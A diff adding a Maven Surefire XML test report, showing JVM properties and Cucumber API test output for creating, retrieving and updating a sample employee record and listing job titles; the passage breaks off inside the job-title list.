@@ -1,0 +1,4862 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<testsuite xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:noNamespaceSchemaLocation="https://maven.apache.org/surefire/maven-surefire-plugin/xsd/surefire-test-report-3.0.xsd" version="3.0" name="runners.APIRunner" time="6.236" tests="7" errors="0" skipped="0" failures="0">
+  <properties>
+    <property name="java.specification.version" value="17"/>
+    <property name="sun.jnu.encoding" value="UTF-8"/>
+    <property name="java.class.path" value="/Users/sergiopele/IdeaProjects/LambdaTest/target/test-classes:/Users/sergiopele/IdeaProjects/LambdaTest/target/classes:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-java/3.141.59/selenium-java-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-api/3.141.59/selenium-api-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-chrome-driver/3.141.59/selenium-chrome-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-edge-driver/3.141.59/selenium-edge-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-firefox-driver/3.141.59/selenium-firefox-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-ie-driver/3.141.59/selenium-ie-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-opera-driver/3.141.59/selenium-opera-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-remote-driver/3.141.59/selenium-remote-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-safari-driver/3.141.59/selenium-safari-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-support/3.141.59/selenium-support-3.141.59.jar:/Users/sergiopele/.m2/repository/net/bytebuddy/byte-buddy/1.8.15/byte-buddy-1.8.15.jar:/Users/sergiopele/.m2/repository/org/apache/commons/commons-exec/1.3/commons-exec-1.3.jar:/Users/sergiopele/.m2/repository/com/google/guava/guava/25.0-jre/guava-25.0-jre.jar:/Users/sergiopele/.m2/repository/com/google/code/findbugs/jsr305/1.3.9/jsr305-1.3.9.jar:/Users/sergiopele/.m2/repository/org/checkerframework/checker-compat-qual/2.0.0/checker-compat-qual-2.0.0.jar:/Users/sergiopele/.m2/repository/com/google/errorprone/error_prone_annotations/2.1.3/error_prone_annotations-2.1.3.jar:/Users/sergiopele/.m2/repository/com/google/j2objc/j2objc-annotations/1.1/j2objc-annotations-1.1.jar:/Users/sergiopele/.m2/repository/org/codehaus/mojo/animal-sniffer-annotations/1.14/animal-sniffer-annotations-1.14.jar:/Users/sergiopele/.m2/repository/com/squareup/okhttp3/okhttp/3.11.0/okhttp-3.11.0.jar:/Users/sergiopele/.m2/repository/com/squareup/okio/okio/1.14.0/okio-1.14.0.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-java/6.9.1/cucumber-java-6.9.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-core/6.9.1/cucumber-core-6.9.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-gherkin/6.9.1/cucumber-gherkin-6.9.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-gherkin-messages/6.9.1/cucumber-gherkin-messages-6.9.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/messages/13.2.1/messages-13.2.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/tag-expressions/3.0.0/tag-expressions-3.0.0.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-expressions/10.3.0/cucumber-expressions-10.3.0.jar:/Users/sergiopele/.m2/repository/io/cucumber/datatable/3.5.0/datatable-3.5.0.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-plugin/6.9.1/cucumber-plugin-6.9.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/docstring/6.9.1/docstring-6.9.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/html-formatter/9.0.0/html-formatter-9.0.0.jar:/Users/sergiopele/.m2/repository/io/cucumber/create-meta/2.0.4/create-meta-2.0.4.jar:/Users/sergiopele/.m2/repository/org/apiguardian/apiguardian-api/1.1.0/apiguardian-api-1.1.0.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-junit/6.9.1/cucumber-junit-6.9.1.jar:/Users/sergiopele/.m2/repository/junit/junit/4.13.1/junit-4.13.1.jar:/Users/sergiopele/.m2/repository/org/hamcrest/hamcrest-core/1.3/hamcrest-core-1.3.jar:/Users/sergiopele/.m2/repository/io/github/bonigarcia/webdrivermanager/3.8.1/webdrivermanager-3.8.1.jar:/Users/sergiopele/.m2/repository/org/slf4j/slf4j-api/1.7.25/slf4j-api-1.7.25.jar:/Users/sergiopele/.m2/repository/com/google/code/gson/gson/2.8.5/gson-2.8.5.jar:/Users/sergiopele/.m2/repository/org/apache/commons/commons-lang3/3.8.1/commons-lang3-3.8.1.jar:/Users/sergiopele/.m2/repository/org/apache/httpcomponents/httpclient/4.5.6/httpclient-4.5.6.jar:/Users/sergiopele/.m2/repository/org/apache/httpcomponents/httpcore/4.4.10/httpcore-4.4.10.jar:/Users/sergiopele/.m2/repository/commons-logging/commons-logging/1.2/commons-logging-1.2.jar:/Users/sergiopele/.m2/repository/org/rauschig/jarchivelib/1.0.0/jarchivelib-1.0.0.jar:/Users/sergiopele/.m2/repository/org/jsoup/jsoup/1.11.3/jsoup-1.11.3.jar:/Users/sergiopele/.m2/repository/org/apache/poi/poi/4.1.2/poi-4.1.2.jar:/Users/sergiopele/.m2/repository/commons-codec/commons-codec/1.13/commons-codec-1.13.jar:/Users/sergiopele/.m2/repository/org/apache/commons/commons-collections4/4.4/commons-collections4-4.4.jar:/Users/sergiopele/.m2/repository/org/apache/commons/commons-math3/3.6.1/commons-math3-3.6.1.jar:/Users/sergiopele/.m2/repository/com/zaxxer/SparseBitSet/1.2/SparseBitSet-1.2.jar:/Users/sergiopele/.m2/repository/org/apache/poi/poi-ooxml/4.1.2/poi-ooxml-4.1.2.jar:/Users/sergiopele/.m2/repository/org/apache/poi/poi-ooxml-schemas/4.1.2/poi-ooxml-schemas-4.1.2.jar:/Users/sergiopele/.m2/repository/org/apache/xmlbeans/xmlbeans/3.1.0/xmlbeans-3.1.0.jar:/Users/sergiopele/.m2/repository/org/apache/commons/commons-compress/1.19/commons-compress-1.19.jar:/Users/sergiopele/.m2/repository/com/github/virtuald/curvesapi/1.06/curvesapi-1.06.jar:/Users/sergiopele/.m2/repository/commons-io/commons-io/2.8.0/commons-io-2.8.0.jar:/Users/sergiopele/.m2/repository/org/projectlombok/lombok/1.18.22/lombok-1.18.22.jar:/Users/sergiopele/.m2/repository/log4j/log4j/1.2.16/log4j-1.2.16.jar:/Users/sergiopele/.m2/repository/com/googlecode/json-simple/json-simple/1.1.1/json-simple-1.1.1.jar:/Users/sergiopele/.m2/repository/io/rest-assured/json-schema-validator/4.3.0/json-schema-validator-4.3.0.jar:/Users/sergiopele/.m2/repository/com/github/java-json-tools/json-schema-validator/2.2.10/json-schema-validator-2.2.10.jar:/Users/sergiopele/.m2/repository/com/github/java-json-tools/json-schema-core/1.2.10/json-schema-core-1.2.10.jar:/Users/sergiopele/.m2/repository/com/github/java-json-tools/jackson-coreutils/1.9/jackson-coreutils-1.9.jar:/Users/sergiopele/.m2/repository/com/fasterxml/jackson/core/jackson-databind/2.2.3/jackson-databind-2.2.3.jar:/Users/sergiopele/.m2/repository/com/fasterxml/jackson/core/jackson-annotations/2.2.3/jackson-annotations-2.2.3.jar:/Users/sergiopele/.m2/repository/com/fasterxml/jackson/core/jackson-core/2.2.3/jackson-core-2.2.3.jar:/Users/sergiopele/.m2/repository/com/github/fge/msg-simple/1.1/msg-simple-1.1.jar:/Users/sergiopele/.m2/repository/com/github/fge/btf/1.2/btf-1.2.jar:/Users/sergiopele/.m2/repository/com/github/fge/uri-template/0.9/uri-template-0.9.jar:/Users/sergiopele/.m2/repository/org/mozilla/rhino/1.7.7.1/rhino-1.7.7.1.jar:/Users/sergiopele/.m2/repository/javax/mail/mailapi/1.4.3/mailapi-1.4.3.jar:/Users/sergiopele/.m2/repository/javax/activation/activation/1.1/activation-1.1.jar:/Users/sergiopele/.m2/repository/joda-time/joda-time/2.9.7/joda-time-2.9.7.jar:/Users/sergiopele/.m2/repository/com/googlecode/libphonenumber/libphonenumber/8.0.0/libphonenumber-8.0.0.jar:/Users/sergiopele/.m2/repository/net/sf/jopt-simple/jopt-simple/5.0.3/jopt-simple-5.0.3.jar:/Users/sergiopele/.m2/repository/org/hamcrest/hamcrest/2.1/hamcrest-2.1.jar:/Users/sergiopele/.m2/repository/io/rest-assured/rest-assured/4.5.1/rest-assured-4.5.1.jar:/Users/sergiopele/.m2/repository/org/codehaus/groovy/groovy/3.0.9/groovy-3.0.9.jar:/Users/sergiopele/.m2/repository/org/codehaus/groovy/groovy-xml/3.0.9/groovy-xml-3.0.9.jar:/Users/sergiopele/.m2/repository/org/apache/httpcomponents/httpmime/4.5.13/httpmime-4.5.13.jar:/Users/sergiopele/.m2/repository/org/ccil/cowan/tagsoup/tagsoup/1.2.1/tagsoup-1.2.1.jar:/Users/sergiopele/.m2/repository/io/rest-assured/json-path/4.5.1/json-path-4.5.1.jar:/Users/sergiopele/.m2/repository/org/codehaus/groovy/groovy-json/3.0.9/groovy-json-3.0.9.jar:/Users/sergiopele/.m2/repository/io/rest-assured/rest-assured-common/4.5.1/rest-assured-common-4.5.1.jar:/Users/sergiopele/.m2/repository/io/rest-assured/xml-path/4.5.1/xml-path-4.5.1.jar:/Users/sergiopele/.m2/repository/mysql/mysql-connector-java/8.0.30/mysql-connector-java-8.0.30.jar:/Users/sergiopele/.m2/repository/com/google/protobuf/protobuf-java/3.19.4/protobuf-java-3.19.4.jar:"/>
+    <property name="java.vm.vendor" value="Oracle Corporation"/>
+    <property name="sun.arch.data.model" value="64"/>
+    <property name="java.vendor.url" value="https://java.oracle.com/"/>
+    <property name="os.name" value="Mac OS X"/>
+    <property name="java.vm.specification.version" value="17"/>
+    <property name="sun.java.launcher" value="SUN_STANDARD"/>
+    <property name="user.country" value="GB"/>
+    <property name="sun.boot.library.path" value="/Users/sergiopele/Library/Java/JavaVirtualMachines/openjdk-17.0.1/Contents/Home/lib"/>
+    <property name="sun.java.command" value="/Users/sergiopele/IdeaProjects/LambdaTest/target/surefire/surefirebooter-20230125212139071_3.jar /Users/sergiopele/IdeaProjects/LambdaTest/target/surefire 2023-01-25T21-21-38_596-jvmRun1 surefire-20230125212139071_1tmp surefire_0-20230125212139071_2tmp"/>
+    <property name="http.nonProxyHosts" value="local|*.local|169.254/16|*.169.254/16"/>
+    <property name="jdk.debug" value="release"/>
+    <property name="test" value="APIRunner"/>
+    <property name="surefire.test.class.path" value="/Users/sergiopele/IdeaProjects/LambdaTest/target/test-classes:/Users/sergiopele/IdeaProjects/LambdaTest/target/classes:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-java/3.141.59/selenium-java-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-api/3.141.59/selenium-api-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-chrome-driver/3.141.59/selenium-chrome-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-edge-driver/3.141.59/selenium-edge-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-firefox-driver/3.141.59/selenium-firefox-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-ie-driver/3.141.59/selenium-ie-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-opera-driver/3.141.59/selenium-opera-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-remote-driver/3.141.59/selenium-remote-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-safari-driver/3.141.59/selenium-safari-driver-3.141.59.jar:/Users/sergiopele/.m2/repository/org/seleniumhq/selenium/selenium-support/3.141.59/selenium-support-3.141.59.jar:/Users/sergiopele/.m2/repository/net/bytebuddy/byte-buddy/1.8.15/byte-buddy-1.8.15.jar:/Users/sergiopele/.m2/repository/org/apache/commons/commons-exec/1.3/commons-exec-1.3.jar:/Users/sergiopele/.m2/repository/com/google/guava/guava/25.0-jre/guava-25.0-jre.jar:/Users/sergiopele/.m2/repository/com/google/code/findbugs/jsr305/1.3.9/jsr305-1.3.9.jar:/Users/sergiopele/.m2/repository/org/checkerframework/checker-compat-qual/2.0.0/checker-compat-qual-2.0.0.jar:/Users/sergiopele/.m2/repository/com/google/errorprone/error_prone_annotations/2.1.3/error_prone_annotations-2.1.3.jar:/Users/sergiopele/.m2/repository/com/google/j2objc/j2objc-annotations/1.1/j2objc-annotations-1.1.jar:/Users/sergiopele/.m2/repository/org/codehaus/mojo/animal-sniffer-annotations/1.14/animal-sniffer-annotations-1.14.jar:/Users/sergiopele/.m2/repository/com/squareup/okhttp3/okhttp/3.11.0/okhttp-3.11.0.jar:/Users/sergiopele/.m2/repository/com/squareup/okio/okio/1.14.0/okio-1.14.0.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-java/6.9.1/cucumber-java-6.9.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-core/6.9.1/cucumber-core-6.9.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-gherkin/6.9.1/cucumber-gherkin-6.9.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-gherkin-messages/6.9.1/cucumber-gherkin-messages-6.9.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/messages/13.2.1/messages-13.2.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/tag-expressions/3.0.0/tag-expressions-3.0.0.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-expressions/10.3.0/cucumber-expressions-10.3.0.jar:/Users/sergiopele/.m2/repository/io/cucumber/datatable/3.5.0/datatable-3.5.0.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-plugin/6.9.1/cucumber-plugin-6.9.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/docstring/6.9.1/docstring-6.9.1.jar:/Users/sergiopele/.m2/repository/io/cucumber/html-formatter/9.0.0/html-formatter-9.0.0.jar:/Users/sergiopele/.m2/repository/io/cucumber/create-meta/2.0.4/create-meta-2.0.4.jar:/Users/sergiopele/.m2/repository/org/apiguardian/apiguardian-api/1.1.0/apiguardian-api-1.1.0.jar:/Users/sergiopele/.m2/repository/io/cucumber/cucumber-junit/6.9.1/cucumber-junit-6.9.1.jar:/Users/sergiopele/.m2/repository/junit/junit/4.13.1/junit-4.13.1.jar:/Users/sergiopele/.m2/repository/org/hamcrest/hamcrest-core/1.3/hamcrest-core-1.3.jar:/Users/sergiopele/.m2/repository/io/github/bonigarcia/webdrivermanager/3.8.1/webdrivermanager-3.8.1.jar:/Users/sergiopele/.m2/repository/org/slf4j/slf4j-api/1.7.25/slf4j-api-1.7.25.jar:/Users/sergiopele/.m2/repository/com/google/code/gson/gson/2.8.5/gson-2.8.5.jar:/Users/sergiopele/.m2/repository/org/apache/commons/commons-lang3/3.8.1/commons-lang3-3.8.1.jar:/Users/sergiopele/.m2/repository/org/apache/httpcomponents/httpclient/4.5.6/httpclient-4.5.6.jar:/Users/sergiopele/.m2/repository/org/apache/httpcomponents/httpcore/4.4.10/httpcore-4.4.10.jar:/Users/sergiopele/.m2/repository/commons-logging/commons-logging/1.2/commons-logging-1.2.jar:/Users/sergiopele/.m2/repository/org/rauschig/jarchivelib/1.0.0/jarchivelib-1.0.0.jar:/Users/sergiopele/.m2/repository/org/jsoup/jsoup/1.11.3/jsoup-1.11.3.jar:/Users/sergiopele/.m2/repository/org/apache/poi/poi/4.1.2/poi-4.1.2.jar:/Users/sergiopele/.m2/repository/commons-codec/commons-codec/1.13/commons-codec-1.13.jar:/Users/sergiopele/.m2/repository/org/apache/commons/commons-collections4/4.4/commons-collections4-4.4.jar:/Users/sergiopele/.m2/repository/org/apache/commons/commons-math3/3.6.1/commons-math3-3.6.1.jar:/Users/sergiopele/.m2/repository/com/zaxxer/SparseBitSet/1.2/SparseBitSet-1.2.jar:/Users/sergiopele/.m2/repository/org/apache/poi/poi-ooxml/4.1.2/poi-ooxml-4.1.2.jar:/Users/sergiopele/.m2/repository/org/apache/poi/poi-ooxml-schemas/4.1.2/poi-ooxml-schemas-4.1.2.jar:/Users/sergiopele/.m2/repository/org/apache/xmlbeans/xmlbeans/3.1.0/xmlbeans-3.1.0.jar:/Users/sergiopele/.m2/repository/org/apache/commons/commons-compress/1.19/commons-compress-1.19.jar:/Users/sergiopele/.m2/repository/com/github/virtuald/curvesapi/1.06/curvesapi-1.06.jar:/Users/sergiopele/.m2/repository/commons-io/commons-io/2.8.0/commons-io-2.8.0.jar:/Users/sergiopele/.m2/repository/org/projectlombok/lombok/1.18.22/lombok-1.18.22.jar:/Users/sergiopele/.m2/repository/log4j/log4j/1.2.16/log4j-1.2.16.jar:/Users/sergiopele/.m2/repository/com/googlecode/json-simple/json-simple/1.1.1/json-simple-1.1.1.jar:/Users/sergiopele/.m2/repository/io/rest-assured/json-schema-validator/4.3.0/json-schema-validator-4.3.0.jar:/Users/sergiopele/.m2/repository/com/github/java-json-tools/json-schema-validator/2.2.10/json-schema-validator-2.2.10.jar:/Users/sergiopele/.m2/repository/com/github/java-json-tools/json-schema-core/1.2.10/json-schema-core-1.2.10.jar:/Users/sergiopele/.m2/repository/com/github/java-json-tools/jackson-coreutils/1.9/jackson-coreutils-1.9.jar:/Users/sergiopele/.m2/repository/com/fasterxml/jackson/core/jackson-databind/2.2.3/jackson-databind-2.2.3.jar:/Users/sergiopele/.m2/repository/com/fasterxml/jackson/core/jackson-annotations/2.2.3/jackson-annotations-2.2.3.jar:/Users/sergiopele/.m2/repository/com/fasterxml/jackson/core/jackson-core/2.2.3/jackson-core-2.2.3.jar:/Users/sergiopele/.m2/repository/com/github/fge/msg-simple/1.1/msg-simple-1.1.jar:/Users/sergiopele/.m2/repository/com/github/fge/btf/1.2/btf-1.2.jar:/Users/sergiopele/.m2/repository/com/github/fge/uri-template/0.9/uri-template-0.9.jar:/Users/sergiopele/.m2/repository/org/mozilla/rhino/1.7.7.1/rhino-1.7.7.1.jar:/Users/sergiopele/.m2/repository/javax/mail/mailapi/1.4.3/mailapi-1.4.3.jar:/Users/sergiopele/.m2/repository/javax/activation/activation/1.1/activation-1.1.jar:/Users/sergiopele/.m2/repository/joda-time/joda-time/2.9.7/joda-time-2.9.7.jar:/Users/sergiopele/.m2/repository/com/googlecode/libphonenumber/libphonenumber/8.0.0/libphonenumber-8.0.0.jar:/Users/sergiopele/.m2/repository/net/sf/jopt-simple/jopt-simple/5.0.3/jopt-simple-5.0.3.jar:/Users/sergiopele/.m2/repository/org/hamcrest/hamcrest/2.1/hamcrest-2.1.jar:/Users/sergiopele/.m2/repository/io/rest-assured/rest-assured/4.5.1/rest-assured-4.5.1.jar:/Users/sergiopele/.m2/repository/org/codehaus/groovy/groovy/3.0.9/groovy-3.0.9.jar:/Users/sergiopele/.m2/repository/org/codehaus/groovy/groovy-xml/3.0.9/groovy-xml-3.0.9.jar:/Users/sergiopele/.m2/repository/org/apache/httpcomponents/httpmime/4.5.13/httpmime-4.5.13.jar:/Users/sergiopele/.m2/repository/org/ccil/cowan/tagsoup/tagsoup/1.2.1/tagsoup-1.2.1.jar:/Users/sergiopele/.m2/repository/io/rest-assured/json-path/4.5.1/json-path-4.5.1.jar:/Users/sergiopele/.m2/repository/org/codehaus/groovy/groovy-json/3.0.9/groovy-json-3.0.9.jar:/Users/sergiopele/.m2/repository/io/rest-assured/rest-assured-common/4.5.1/rest-assured-common-4.5.1.jar:/Users/sergiopele/.m2/repository/io/rest-assured/xml-path/4.5.1/xml-path-4.5.1.jar:/Users/sergiopele/.m2/repository/mysql/mysql-connector-java/8.0.30/mysql-connector-java-8.0.30.jar:/Users/sergiopele/.m2/repository/com/google/protobuf/protobuf-java/3.19.4/protobuf-java-3.19.4.jar:"/>
+    <property name="sun.cpu.endian" value="little"/>
+    <property name="user.home" value="/Users/sergiopele"/>
+    <property name="user.language" value="en"/>
+    <property name="java.specification.vendor" value="Oracle Corporation"/>
+    <property name="java.version.date" value="2021-10-19"/>
+    <property name="java.home" value="/Users/sergiopele/Library/Java/JavaVirtualMachines/openjdk-17.0.1/Contents/Home"/>
+    <property name="file.separator" value="/"/>
+    <property name="basedir" value="/Users/sergiopele/IdeaProjects/LambdaTest"/>
+    <property name="java.vm.compressedOopsMode" value="Zero based"/>
+    <property name="line.separator" value="&#10;"/>
+    <property name="java.specification.name" value="Java Platform API Specification"/>
+    <property name="java.vm.specification.vendor" value="Oracle Corporation"/>
+    <property name="surefire.real.class.path" value="/Users/sergiopele/IdeaProjects/LambdaTest/target/surefire/surefirebooter-20230125212139071_3.jar"/>
+    <property name="sun.management.compiler" value="HotSpot 64-Bit Tiered Compilers"/>
+    <property name="ftp.nonProxyHosts" value="local|*.local|169.254/16|*.169.254/16"/>
+    <property name="java.runtime.version" value="17.0.1+12-39"/>
+    <property name="user.name" value="sergiopele"/>
+    <property name="path.separator" value=":"/>
+    <property name="os.version" value="13.1"/>
+    <property name="java.runtime.name" value="OpenJDK Runtime Environment"/>
+    <property name="file.encoding" value="UTF-8"/>
+    <property name="java.vm.name" value="OpenJDK 64-Bit Server VM"/>
+    <property name="localRepository" value="/Users/sergiopele/.m2/repository"/>
+    <property name="java.vendor.url.bug" value="https://bugreport.java.com/bugreport/"/>
+    <property name="java.io.tmpdir" value="/var/folders/sq/674wl2416j1d7lqqmh409h5r0000gn/T/"/>
+    <property name="java.version" value="17.0.1"/>
+    <property name="user.dir" value="/Users/sergiopele/IdeaProjects/LambdaTest"/>
+    <property name="os.arch" value="x86_64"/>
+    <property name="java.vm.specification.name" value="Java Virtual Machine Specification"/>
+    <property name="native.encoding" value="UTF-8"/>
+    <property name="java.library.path" value="/Users/sergiopele/Library/Java/Extensions:/Library/Java/Extensions:/Network/Library/Java/Extensions:/System/Library/Java/Extensions:/usr/lib/java:."/>
+    <property name="java.vm.info" value="mixed mode, sharing"/>
+    <property name="java.vendor" value="Oracle Corporation"/>
+    <property name="java.vm.version" value="17.0.1+12-39"/>
+    <property name="sun.io.unicode.encoding" value="UnicodeBig"/>
+    <property name="socksNonProxyHosts" value="local|*.local|169.254/16|*.169.254/16"/>
+    <property name="java.class.version" value="61.0"/>
+  </properties>
+  <testcase name="api test to creating new employee" classname="API workflow test" time="3.407">
+    <system-out><![CDATA[
+@api
+Scenario: api test to creating new employee                                                                      # src/test/resources/features/APITesting.feature:7
+{
+    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzQ2OTk2OTMsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTY3NDc0Mjg5MywidXNlcklkIjoiNTAzNiJ9.0tjmTY__MLrVu5WIj21fTfKW5jVjoyoZKA3ba47-WBo"
+}
+  Given JWT is generated                                                                                         # APISteps.GenerateTokenStep.jwt_is_generated()
+  Given request is prepared and body  contains "Roger", "Gold", "MS", "M", "1992-08-01", "employee", "Developer" # APISteps.CreateNewEmployee.request_is_prepared_and_body_contains(java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String,java.lang.String)
+  When post call is made to create employee                                                                      # APISteps.CreateNewEmployee.post_call_is_made_to_create_employee()
+  Then status code is 201                                                                                        # APISteps.CreateNewEmployee.status_code_is(java.lang.Integer)
+{
+    "Message": "Employee Created",
+    "Employee": {
+        "employee_id": "51659A",
+        "emp_firstname": "Roger",
+        "emp_middle_name": "MS",
+        "emp_lastname": "Gold",
+        "emp_birthday": "1992-08-01",
+        "emp_job_title": "Developer",
+        "emp_status": "employee"
+    }
+}
+  And expected message is "Employee Created"                                                                     # APISteps.CreateNewEmployee.expected_message_is_employee_created(java.lang.String)
+  And "Employee.employee_id" is stored in global variables                                                       # APISteps.CreateNewEmployee.is_stored_in_global_variables(java.lang.String)
+]]></system-out>
+    <system-err><![CDATA[log4j:WARN No appenders could be found for logger (org.apache.http.impl.conn.BasicClientConnectionManager).
+log4j:WARN Please initialize the log4j system properly.
+log4j:WARN See http://logging.apache.org/log4j/1.2/faq.html#noconfig for more info.
+]]></system-err>
+  </testcase>
+  <testcase name="api test to retrieve created employee" classname="API workflow test" time="0.268">
+    <system-out><![CDATA[
+@api
+Scenario: api test to retrieve created employee                      # src/test/resources/features/APITesting.feature:15
+{
+    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzQ2OTk2OTQsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTY3NDc0Mjg5NCwidXNlcklkIjoiNTAzNiJ9.T7QVV1H0vLvMmvW1KmEyTGekYQpmRPNJcFVgwqGeHpA"
+}
+  Given JWT is generated                                             # APISteps.GenerateTokenStep.jwt_is_generated()
+  Given request to retrieve employee is prepared                     # APISteps.RetrieveCreatedEmployee.request_to_retrieve_employee_is_prepared()
+  When get call is made for retrieving employee                      # APISteps.RetrieveCreatedEmployee.get_call_is_made_for_retrieving_employee()
+  Then status code is 200                                            # APISteps.CreateNewEmployee.status_code_is(java.lang.Integer)
+{
+    "employee": {
+        "employee_id": "51659A",
+        "emp_firstname": "Roger",
+        "emp_middle_name": "MS",
+        "emp_lastname": "Gold",
+        "emp_birthday": "1992-08-01",
+        "emp_gender": "Male",
+        "emp_job_title": "Developer",
+        "emp_status": "Employee"
+    }
+}
+  And "employee.employee_id" is match with global employee id value  # APISteps.RetrieveCreatedEmployee.is_match_with_global_employee_id_value(java.lang.String)
+  And "employee" object data match with created employee information # APISteps.RetrieveCreatedEmployee.object_data_match_with_created_employee_information(java.lang.String,io.cucumber.datatable.DataTable)
+]]></system-out>
+  </testcase>
+  <testcase name="api test to partially update created employee" classname="API workflow test" time="0.333">
+    <system-out><![CDATA[
+@api
+Scenario: api test to partially update created employee                                   # src/test/resources/features/APITesting.feature:25
+{
+    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzQ2OTk2OTQsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTY3NDc0Mjg5NCwidXNlcklkIjoiNTAzNiJ9.T7QVV1H0vLvMmvW1KmEyTGekYQpmRPNJcFVgwqGeHpA"
+}
+  Given JWT is generated                                                                  # APISteps.GenerateTokenStep.jwt_is_generated()
+  Given request to update employee is prepared and body contains information for updating # APISteps.PartialEmployeeUpdate.request_to_update_employee_is_prepared_and_body_contains_information_for_updating(io.cucumber.datatable.DataTable)
+  When patch call is made for updating employee                                           # APISteps.PartialEmployeeUpdate.patch_call_is_made_for_updating_employee()
+  Then status code is 201                                                                 # APISteps.CreateNewEmployee.status_code_is(java.lang.Integer)
+{
+    "Message": "Employee record updated successfully",
+    "employee": {
+        "employee_id": "51659A",
+        "emp_firstname": "Roger",
+        "emp_middle_name": "MS",
+        "emp_lastname": "Gold",
+        "emp_birthday": "1992-08-01",
+        "emp_gender": "Male",
+        "emp_job_title": "UI Developer",
+        "emp_status": "Employee"
+    }
+}
+  And expected "Message" is "Employee record updated successfully"                        # APISteps.PartialEmployeeUpdate.expected_is(java.lang.String,java.lang.String)
+]]></system-out>
+  </testcase>
+  <testcase name="api test to get all jobs title" classname="API workflow test" time="0.508">
+    <system-out><![CDATA[
+@api
+Scenario: api test to get all jobs title      # src/test/resources/features/APITesting.feature:34
+{
+    "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2NzQ2OTk2OTUsImlzcyI6ImxvY2FsaG9zdCIsImV4cCI6MTY3NDc0Mjg5NSwidXNlcklkIjoiNTAzNiJ9.d1RjEkkWNMS6EvaDS43KLOi-63inXeBm0w54LnXfwNo"
+}
+  Given JWT is generated                      # APISteps.GenerateTokenStep.jwt_is_generated()
+  Given request is prepared to get job titles # APISteps.GetEmployeesJobTitles.request_is_prepared_to_get_job_titles()
+  When get call is made                       # APISteps.GetEmployeesJobTitles.get_call_is_made()
+  Then status code is 200                     # APISteps.CreateNewEmployee.status_code_is(java.lang.Integer)
+  And object body contains "Jobs"             # APISteps.GetEmployeesJobTitles.object_body_contains(java.lang.String)
+{
+    "Jobs": [
+        {
+            "id": "1",
+            "job": "Cloud Architect"
+        },
+        {
+            "id": "2",
+            "job": "Cloud Consultant"
+        },
+        {
+            "id": "3",
+            "job": "Cloud Product and Project Manager"
+        },
+        {
+            "id": "4",
+            "job": "IT Analyst"
+        },
+        {
+            "id": "5",
+            "job": "Network Administrator"
+        },
+        {
+            "id": "6",
+            "job": "IT Support Manager"
+        },
+        {
+            "id": "7",
+            "job": "Data Quality Manager"
+        },
+        {
+            "id": "8",
+            "job": "Database Administrator"
+        },
+        {
+            "id": "9",
+            "job": "Application Developer"
+        },
+        {
+            "id": "10",
+            "job": "Developer"
+        },
+        {
+            "id": "11",
+            "job": "Accountant"
+        },
+        {
+            "id": "12",
+            "job": "Chief Financial Officer"
+        },
+        {
+            "id": "13",
+            "job": "Controller"
+        },
+        {
+            "id": "14",
+            "job": "Production Manager"
+        },
+        {
+            "id": "15",
+            "job": "Jr Production Manager"
+        },
+        {
+            "id": "16",
+            "job": "Sales&Marketing Manager"
+        },
+        {
+            "id": "18",
+            "job": "Jr Sales Manager"
+        },
+        {
+            "id": "20",
+            "job": "Graphic Designer"
+        },
+        {
